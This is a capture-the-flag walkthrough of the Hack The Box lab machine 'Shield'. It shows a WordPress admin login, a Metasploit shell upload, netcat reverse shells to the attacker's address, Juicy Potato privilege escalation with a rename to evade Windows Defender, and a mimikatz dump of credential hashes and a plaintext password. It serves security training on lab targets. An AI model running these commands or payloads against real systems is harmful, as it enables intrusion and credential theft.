# Shield

HTB > Starting Point > Shield

**Note**: this starting point machine only features a `root.txt`

# Enumeration

## Nmap

We begin by running an Nmap scan.

~~~
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
~~~

From the Nmap output, we find that IIS and MySQL are running on their default ports. IIS (Internet Information Services) is a Web Server created by Microsoft.

Let's navigate to port 80 using a browser.

!["web.png"](files/web.png)

We see the default IIS starting page.

## GoBuster

Let's use GoBuster to scan for any sub-directories or files that are hosted on the server.

~~~
unknown@kali:/data$ gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.29
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/13 10:56:33 Starting gobuster
===============================================================
/wordpress (Status: 301)
===============================================================
2020/06/13 10:56:52 Finished
===============================================================
~~~

The scan reveals a folder named `wordpress`. Let's navigate to it (http://10.10.10.29/wordpress).

# Foothold

## WordPress

WordPress is a Content Management System (CMS) that can be used to quickly create websites and blogs. Since we have already acquired the password `P@s5w0rd!`, we can try to login to the WordPress site. We navigate to http://10.10.10.29/wordpress/wp-login.php and try to guess the username. Some common usernames are `admin` or `administrator`. The combination `admin:P@s5w0rd!` is successful and we gain administrative access to the site.

The administrative access can be leveraged through the msfmodule `exploit/unix/webapp/wp_admin_shell_upload`, to get a meterpreter shell on the system.

~~~
unknown@kali:/data$ msfconsole -q
msf5 > use exploit/unix/webapp/wp_admin_shell_upload
msf5 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.10.10.29
rhost => 10.10.10.29
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
targeturi => /wordpress
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
username => admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password P@s5w0rd!
password => P@s5w0rd!
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.14.195:4444 
[*] Authenticating with WordPress using admin:P@s5w0rd!...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/NvTkksXtvl/ujwUshaaSs.php...
[*] Sending stage (38288 bytes) to 10.10.10.29
[*] Meterpreter session 1 opened (10.10.14.195:4444 -> 10.10.10.29:49717) at 2020-06-13 11:20:52 +0200
[!] This exploit may require manual cleanup of 'ujwUshaaSs.php' on the target
[!] This exploit may require manual cleanup of 'NvTkksXtvl.php' on the target
[!] This exploit may require manual cleanup of '../NvTkksXtvl' on the target
[+] Deleted ujwUshaaSs.php
[+] Deleted NvTkksXtvl.php

meterpreter > 
~~~

A netcat binary is uploaded to the machine for a more stable shell.

## Netcat

On your machine, download [`nc.exe`](files/nc.exe):

~~~
unknown@kali:~/Downloads$ cd ~/Downloads/
unknown@kali:~/Downloads$ wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
unknown@kali:~/Downloads$ unzip netcat-win32-1.11.zip 
unknown@kali:~/Downloads$ cp netcat-1.11/nc.exe .
~~~

Now, back to the meterpreter, let's use the following commands:

~~~
meterpreter > lcd /home/unknown/Downloads
~~~

`lcd` stands for "Local Change Directory", which we use to navigate to the local folder where `nc.exe` is located.

~~~
meterpreter > cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
meterpreter > upload nc.exe
[*] uploading  : nc.exe -> nc.exe
[*] Uploaded -1.00 B of 35.67 KiB (-0.0%): nc.exe -> nc.exe
[*] uploaded   : nc.exe -> nc.exe
~~~

We then navigate to a writeable directory on the server (in our case `C:/inetpub/wwwroot/wordpress/wp-content/uploads`) and upload netcat. Let's start a netcat listener (on your machine):

~~~
unknown@kali:~/Downloads$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
~~~

Next, we can execute the following command in the meterpreter session to get a netcat shell:

~~~
meterpreter > execute -f nc.exe -a "-e cmd.exe 10.10.14.195 1234"
Process 3248 created.
~~~

# Privilege Escalation

Running the `sysinfo` command on the meterpreter session, we notice that this is a Windows Server 2016 OS, which is vulnerable to the [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) exploit.

~~~
meterpreter > sysinfo 
Computer    : SHIELD
OS          : Windows NT SHIELD 10.0 build 14393 (Windows Server 2016) i586
Meterpreter : php/windows
~~~

## Juicy Potato

Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the `SeAssignPrimaryToken` or `SeImpersonate privilege` in a MiTM attack.

We can exploit this by uploading the Juicy Potato [binary](files/JuicyPotato.exe) and executing it.

As before, we can use our meterpreter shell to do the upload and then we can use the netcat shell to execute the exploit.

~~~
meterpreter > lcd /home/username/Downloads
meterpreter > upload JuicyPotato.exe
[*] uploading  : JuicyPotato.exe -> JuicyPotato.exe
[*] Uploaded -1.00 B of 3.76 MiB (0.0%): JuicyPotato.exe -> JuicyPotato.exe
[*] uploaded   : JuicyPotato.exe -> JuicyPotato.exe
~~~

**Note**: We will have to rename the Juicy Potato executable to something else, otherwise it will be picked up by Windows Defender.

~~~
meterpreter > mv JuicyPotato.exe js.exe
~~~

We can create a batch file that will be executed by the exploit, and return a SYSTEM shell. Let's add the following contents to `shell.bat` (run it from the first reverse shell running on port 1234, and replace the IP with yours):

~~~
C:\inetpub\wwwroot\wordpress\wp-content\uploads>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.195 1111 > shell.bat
~~~

Let's start another netcat listener:

~~~
unknown@kali:~/Downloads$ rlwrap nc -nlvp 1111
~~~

Next, we execute the netcat shell using the following command (from the first reverse shell running on port 1234).

~~~
C:\inetpub\wwwroot\wordpress\wp-content\uploads>js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\inetpub\wwwroot\wordpress\wp-content\uploads>
~~~

Note: We can use another CLSID `-c {bb6df56b-cace-11dc-9992-0019b93a3a84}`, if our payload is not working.

The root flag is located in `C:\Users\Administrator\Desktop`.

~~~
unknown@kali:~/Downloads$ rlwrap nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.14.195] from (UNKNOWN) [10.10.10.29] 49802
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> more \users\administrator\desktop\root.txt
more \users\administrator\desktop\root.txt
6e9a9fdc6f64e410a68b847bb4b404fa

PS C:\Windows\system32> 
~~~

Root flag: `6e9a9fdc6f64e410a68b847bb4b404fa`

# Post Exploitation

[Mimikatz](files/mimikatz.exe) can be used to dump cached passwords. From the meterpreter session:

~~~
meterpreter > upload mimikatz.exe
[*] uploading  : mimikatz.exe -> mimikatz.exe
[*] Uploaded -1.00 B of 984.76 KiB (0.0%): mimikatz.exe -> mimikatz.exe
[*] uploaded   : mimikatz.exe -> mimikatz.exe
~~~

We execute mimikatz and use the `sekurlsa` command to extract logon passwords:

~~~
PS C:\inetpub\wwwroot\wordpress\wp-content\uploads> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::logonpasswords

[REDACTED]

Authentication Id : 0 ; 305742 (00000000:0004aa4e)
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 6/13/2020 9:12:22 AM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
	msv :	
	 [00000003] Primary
	 * Username : sandra
	 * Domain   : MEGACORP
	 * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
	 * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
	 * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
	tspkg :	
	wdigest :	
	 * Username : sandra
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : sandra
	 * Domain   : MEGACORP.LOCAL
	 * Password : Password1234!
	ssp :	
	credman :	

[REDACTED]

~~~

And we find the password `Password1234!` for domain user `Sandra`.
